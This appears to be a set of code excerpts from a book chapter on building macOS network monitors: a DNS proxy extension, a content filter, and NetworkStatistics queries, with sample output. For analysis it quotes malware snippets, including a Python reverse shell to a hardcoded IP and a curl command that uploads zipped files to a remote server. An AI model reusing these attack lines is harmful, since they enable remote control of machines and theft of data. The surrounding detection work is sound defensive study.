["```\ndispatch_queue_t queue = dispatch_queue_create(NULL, NULL); ❶\ndispatch_source_t source = dispatch_source_create(DISPATCH_SOURCE_TYPE_TIMER, 0, 0, queue); ❷\n\nNSUInteger refreshRate = 10;\n\ndispatch_source_set_timer(source, DISPATCH_TIME_NOW, refreshRate * NSEC_PER_SEC, 0); ❸\n\ndispatch_source_set_event_handler(source, ^{ ❹\n    NStatManagerQueryAllSourcesDescriptions(manager, ^{\n        // Code here will execute when the query is complete.\n    });\n});\n\ndispatch_resume(source); ❺ \n```", "```\n0x000000010000f7c2  db  \"https://iwebservicescloud.com/api/v0\", 0\n```", "```\n__snprintf_chk(var_38, var_30, 0x0, 0xffffffffffffffff, \"%s%s?v=%d&c=%s&u=\n%s&os=%s&hw=%s\", \"https://iwebservicescloud.com/api/v0\", r13, 0x2, r12,\nbyte_100023f50, rcx, rax); \n```", "```\n#!/bin/bash\nwhile :\ndo\n    python -c\n        'import socket,subprocess,os;\n        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);\n        s.connect((\"185.243.115.230\",1337));\n        os.dup2(s.fileno(),0);\n        os.dup2(s.fileno(),1);\n        os.dup2(s.fileno(),2);\n        p=subprocess.call([\"/bin/sh\",\"-i\"]);'\n    sleep 5\ndone \n```", "```\n#define EXT_BUNDLE_ID @\"com.example.dnsmonitor.extension\"\n\nOSSystemExtensionRequest* request = [OSSystemExtensionRequest\nactivationRequestForExtension:EXT_BUNDLE_ID\nqueue:dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_HIGH, 0)]; ❶\n\nrequest.delegate = `<object that conforms to the OSSystemExtensionRequestDelegate protocol>`; ❷\n\n[OSSystemExtensionManager.sharedManager submitRequest:request]; ❸ \n```", "```\n#define EXT_BUNDLE_ID @\"com.example.dnsmonitor.extension\"\n\n[NEDNSProxyManager.sharedManager loadFromPreferencesWithCompletionHandler:^(NSError*\n_Nullable error) { ❶\n    NEDNSProxyManager.sharedManager.localizedDescription = @\"DNS Monitor\"; ❷\n\n    NEDNSProxyProviderProtocol* protocol = [[NEDNSProxyProviderProtocol alloc] init]; ❸\n    protocol.providerBundleIdentifier = EXT_BUNDLE_ID;\n    NEDNSProxyManager.sharedManager.providerProtocol = protocol;\n\n    NEDNSProxyManager.sharedManager.enabled = YES; ❹\n\n    [NEDNSProxyManager.sharedManager\n    saveToPreferencesWithCompletionHandler:^(NSError* _Nullable error) { ❺\n        // If there is no error, the DNS proxy provider is running.\n    }];\n}]; \n```", "```\nint main(int argc, const char* argv[]) {\n    [NEProvider startSystemExtensionMode];\n    ...\n dispatch_main();\n} \n```", "```\n<key>NetworkExtension</key>\n<dict>\n    ...\n    <key>NEProviderClasses</key>\n    <dict>\n        <key>com.apple.networkextension.dns-proxy</key>\n        <string>DNSProxyProvider</string>\n    </dict>\n</dict> \n```", "```\n@interface DNSProxyProvider : NEDNSProxyProvider\n    ...\n@end \n```", "```\nstartProxyWithOptions:completionHandler:\nstopProxyWithReason:completionHandler:\nhandleNewFlow: \n```", "```\n#import <dns_util.h>\n...\n\n[flow readDatagramsWithCompletionHandler:^(\nNSArray* datagrams, NSArray* endpoints, NSError* error) {\n    for(int i = 0; i < datagrams.count; i++)  {\n        NSData* packet = datagrams[i];\n\n        dns_reply_t* parsedPacket = dns_parse_packet(packet.bytes, (uint32_t)packet.length); ❶\n        dns_print_reply(parsedPacket, stdout, 0xFFFF); ❷\n        ...\n        dns_free_reply(parsedPacket); ❸\n    }\n    ...\n}]; \n```", "```\nNSMutableArray* questions = [NSMutableArray array];\n\nfor(uint16_t i = 0; i < parsedPacket->header->qdcount; i++) { ❶\n    NSMutableDictionary* details = [NSMutableDictionary dictionary];\n    dns_question_t* question = parsedPacket->question[i];\n\n    details[@\"Question Name\"] =\n    [NSString stringWithUTF8String:question->name]; ❷\n\n    details[@\"Question Class\"] =\n [NSString stringWithUTF8String:dns_class_string(question->dnsclass)];\n\n    details[@\"Question Type\"] =\n    [NSString stringWithUTF8String:dns_type_string(question->dnstype)];\n\n    [questions addObject:details]; ❸\n} \n```", "```\n# **/Applications/DNSMonitor.app/Contents/MacOS/DNSMonitor**\n{\n  \"Process\" : {\n    \"processPath\" : \"\\/usr\\/bin\\/nslookup\",\n    \"processSigningID\" : \"com.apple.nslookup\",\n    \"processID\" : 5295\n  },\n  \"Packet\" : {\n    \"Opcode\" : \"Standard\",\n    \"QR\" : \"Query\",\n    \"Questions\" : [\n      {\n        \"Question Name\" : \"objective-see.org\",\n        \"Question Class\" : \"IN\",\n        \"Question Type\" : \"A\"\n      }\n    ],\n    \"RA\" : \"No recursion available\",\n    \"Rcode\" : \"No error\",\n    \"RD\" : \"Recursion desired\",\n    \"XID\" : 36565,\n    \"TC\" : \"Non-Truncated\",\n    \"AA\" : \"Non-Authoritative\"\n  }\n} \n```", "```\nnw_connection_receive(connection, 1, UINT32_MAX,\n^(dispatch_data_t content, nw_content_context_t context,\nbool is_complete, nw_error_t receive_error) {\n    NSData* packet = (NSData*)content;\n    dns_reply_t* parsedPacket =\n    dns_parse_packet(packet.bytes, (uint32_t)packet.length);\n\n    dns_free_reply(parsedPacket);\n    ...\n}); \n```", "```\nNSMutableArray* answers = [NSMutableArray array];\n\nfor(uint16_t i = 0; i < parsedPacket->header->ancount; i++) { ❶\n    NSMutableDictionary* details = [NSMutableDictionary dictionary];\n    dns_resource_record_t* answer = parsedPacket->answer[i]; ❷\n\n    details[@\"Answer Name\"] = [NSString stringWithUTF8String:answer->name];\n    details[@\"Answer Class\"] = [NSString stringWithUTF8String:dns_class_string(answer->\n    dnsclass)];\n    details[@\"Answer Type\"] = [NSString stringWithUTF8String:dns_type_string(answer->dnstype)];\n    switch(answer->dnstype) { ❸\n        case ns_t_a: ❹\n            details[@\"Host Address\"] = [NSString stringWithUTF8String:inet_ntoa(answer->\n            data.A->addr)]; ❺\n            break;\n        ...\n    }\n    [answers addObject:details];\n} \n```", "```\n# **/Applications/DNSMonitor.app/Contents/MacOS/DNSMonitor**\n{\n  \"Process\" : {\n \"processPath\" : \"\\/usr\\/bin\\/nslookup\",\n    \"processSigningID\" : \"com.apple.nslookup\",\n    \"processID\" : 51021\n  },\n  \"Packet\" : {\n    \"Opcode\" : \"Standard\",\n    \"QR\" : \"Reply\",\n    \"Questions\" : [\n       {\n        \"Question Name\" : \"objective-see.org\",\n        \"Question Class\" : \"IN\",\n        \"Question Type\" : \"A\"\n       }\n    ],\n    \"Answers\" : [\n      {\n        \"Name\" : \"objective-see.org\",\n        \"Type\" : \"IN\",\n        \"Host Address\" : \"185.199.110.153\",\n        \"Class\" : \"IN\"\n      },\n      {\n        \"Name\" : \"objective-see.org\",\n        \"Type\" : \"IN\",\n        \"Host Address\" : \"185.199.109.153\",\n        \"Class\" : \"IN\"\n      },\n      ...\n    ],\n    ...\n  }\n} \n```", "```\n# **/Applications/DNSMonitor.app/Contents/MacOS/DNSMonitor**\n {\n  \"Process\" : {\n    \"processPath” : \"\\/Users\\/user\\/Library\\/Services\\/iWebUpdate\",\n    \"processSigningID\" : nil,\n    \"processID\" : 51304\n   },\n  \"Packet\" : {\n    \"Opcode\" : \"Standard\",\n    \"QR\" : \"Query\",\n    \"Questions\" : [\n      {\n        \"Question Name\" : \"iwebservicescloud.com\",\n        \"Question Class\" : \"IN\",\n        \"Question Type\" : \"A\"\n }\n    ],\n    ...\n  }\n},{\n  \"Process\" : {\n    \"processPath\" : \"\\/Users\\/user\\/Library\\/Services\\/iWebUpdate\",\n    \"processSigningID\" : nil,\n    \"processID\" : 51304\n  },\n  \"Packet\" : {\n    \"Opcode\" : \"Standard\",\n    \"QR\" : \"Reply\",\n    \"Questions\" : [\n      {\n        \"Question Name\" : \"iwebservicescloud.com\",\n        \"Question Class\" : \"IN\",\n        \"Question Type\" : \"A    \"\n      }\n    ],\n    \"Answers\" : [\n      {\n        \"Name\" : \"iwebservicescloud.com\",\n        \"Type\" : \"IN\",\n        \"Host Address\" : \"173.231.184.122\",\n        \"Class\" : \"IN\"\n      }\n    ],\n    ...\n  }\n} \n```", "```\nCFURLRef path = NULL;\nSecCodeRef code = NULL;\naudit_token_t* auditToken = (audit_token_t*)flow.metaData.sourceAppAuditToken.bytes; ❶\n\npid_t pid = audit_token_to_pid(*auditToken); ❷\n\nSecCodeCopyGuestWithAttributes(NULL, (__bridge CFDictionaryRef _Nullable)(@{(_bridge\nNSString*)kSecGuestAttributeAudit:flow.metaData.sourceAppAuditToken}), kSecCSDefaultFlags,\n&code); ❸\n\nSecCodeCopyPath(code, kSecCSDefaultFlags, &path); ❹\n\n// Do something with the process ID and path.\n\nCFRelease(path);\nCFRelease(code); \n```", "```\nNSString* signingID = flow.metaData.sourceAppSigningIdentifier;\n```", "```\n[NEFilterManager.sharedManager loadFromPreferencesWithCompletionHandler:^(NSError*\n_Nullable error) { ❶\n    NEFilterProviderConfiguration* config = [[NEFilterProviderConfiguration alloc] init]; ❷\n\n    config.filterPackets = NO; ❸\n    config.filterSockets = YES;\n\n    NEFilterManager.sharedManager.providerConfiguration = config; ❹\n\n NEFilterManager.sharedManager.enabled = YES;\n\n    [NEFilterManager.sharedManager\n    saveToPreferencesWithCompletionHandler:^(NSError* _Nullable error) { ❺\n        // If there is no error, the filter data provider is running.\n    }];\n}]; \n```", "```\n<key>NEProviderClasses</key>\n<dict>\n    <key>com.apple.networkextension.filter-data<\\d>/key>\n    <string>FilterDataProvider</string>\n</dict>\n... \n```", "```\n@interface FilterDataProvider : NEFilterDataProvider\n    ...\n@end \n```", "```\n-(void)startFilterWithCompletionHandler:(void (^)(NSError* error))completionHandler {\n    NENetworkRule* networkRule = [[NENetworkRule alloc] initWithRemoteNetwork:nil\n    remotePrefix:0 localNetwork:nil localPrefix:0 protocol:NENetworkRuleProtocolAny\n    direction:NETrafficDirectionOutbound]; ❶\n\n    NEFilterRule* filterRule =\n    [[NEFilterRule alloc] initWithNetworkRule:networkRule action:NEFilterActionFilterData]; ❷\n\n    NEFilterSettings* filterSettings =\n    [[NEFilterSettings alloc] initWithRules:@[filterRule] defaultAction:NEFilterActionAllow]; ❸\n\n    [self applySettings:filterSettings completionHandler:^(NSError* _Nullable error) { ❹\n        // If no error occurred, the filter data provider is now filtering.\n    }];\n    ...\n} \n```", "```\n-(NEFilterNewFlowVerdict*)handleNewFlow:(NEFilterFlow*)flow {\n    ...\n    return [NEFilterNewFlowVerdict allowVerdict];\n} \n```", "```\nflow:\n    identifier = D89B5B5D-793C-4940-80FE-54932FAA0500\n    sourceAppIdentifier =.com.apple.curl\n    sourceAppVersion =\n    sourceAppUniqueIdentifier =\n    {length = 20, bytes = 0xbbb73e021281eee708f86d974c91182e955de441}\n    procPID = 26686\n    eprocPID = 26686\n    direction = outbound\n    inBytes = 0\n    outBytes = 0\n    signature =\n    {length = 32, bytes = 0x5a322cd8 f14f63bc a117ddf5 1762fa5abb8291c9 2b6ab2fd}\n    socketID = 5aa2f9354fe80\n    localEndpoint = 0.0.0.0:0\n    remoteEndpoint = 185.199.108.153:80\n    remoteHostname = objective-see.org.\n    protocol = 6\n    family = 2\n    type = 1\n    procUUID = 9C547A5F-AD1C-307C-8C16-426EF9EE2F7F\n    eprocUUID = 9C547A5F-AD1C-307C-8C16-426EF9EE2F7F \n```", "```\nNSString* addr = ((NEFilterSocketFlow*)flow).remoteEndpoint.hostname;\nNSString* port = ((NEFilterSocketFlow*)flow).remoteEndpoint.port; \n```", "```\nCFURLRef path = NULL;\nSecCodeRef code = NULL;\naudit_token_t* token = (audit_token_t*)flow.sourceAppAuditToken.bytes;\n\npid_t pid = audit_token_to_pid(*token);\n\nSecCodeCopyGuestWithAttributes(NULL, (__bridge CFDictionaryRef _Nullable)(@{(__bridge NSString\n*)kSecGuestAttributeAudit:flow.sourceAppAuditToken}), kSecCSDefaultFlags, &code);\n\nSecCodeCopyPath(code, kSecCSDefaultFlags, &path);\n\n// Do something with the process ID and path.\n\nCFRelease(path);\nCFRelease(code); \n```", "```\ncommand = \"curl -k -F \\\"file=@\" + zipname + \"\\\" \\\"https://54.254.189.27/api/\nv1/file/upload\\\" > /dev/null 2>&1\"\nos.system(command) \n```", "```\nflow:\n    identifier = D89B5B5D-793C-4940-41BD-B091F4C00700\n    sourceAppIdentifier =.com.apple.curl\n    sourceAppVersion =\n    sourceAppUniqueIdentifier = {length = 20, bytes =\n    0xbbb73e021281eee708f86d974c91182e955de441}\n    procPID = 87558\n    eprocPID = 87558\n    direction = outbound\n    inBytes = 0\n    outBytes = 0\n    signature = {length = 32, bytes = 0x4ee4a2f2 72c06264\n    f38d479b 6ea2dc39 ... 74aa159c 9153147b}\n    socketID = 7c0f491b0bd41\n    localEndpoint = 0.0.0.0:0\n    remoteEndpoint = 54.254.189.27:443\n    protocol = 6\n    family = 2\n    type = 1\n    procUUID = 9C547A5F-AD1C-307C-8C16-426EF9EE2F7F\n    eprocUUID = 9C547A5F-AD1C-307C-8C16-426EF9EE2F7F\n\nRemote Endpoint: 54.254.189.27:443\n\nProcess ID: 87558\nProcess Path: /usr/bin/curl \n```", "```\n-k -F \"file=`<some file>`\" https://54.254.189.27/api/v1/file/upload\n```"]